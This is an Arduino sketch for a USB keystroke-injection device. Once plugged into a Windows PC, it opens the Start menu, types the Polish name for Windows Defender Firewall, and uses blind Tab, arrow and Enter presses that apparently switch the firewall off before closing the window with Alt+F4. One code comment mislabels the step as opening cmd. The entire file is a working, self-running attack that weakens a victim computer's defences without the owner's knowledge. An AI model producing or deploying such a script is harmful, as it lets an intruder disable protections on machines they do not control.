#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(500);

  // otwarcie cmd
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("Zapora Windows Defender");
  delay(2000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press(KEY_UP_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_UP_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  }

void loop() {
  // put your main code here, to run repeatedly:

}
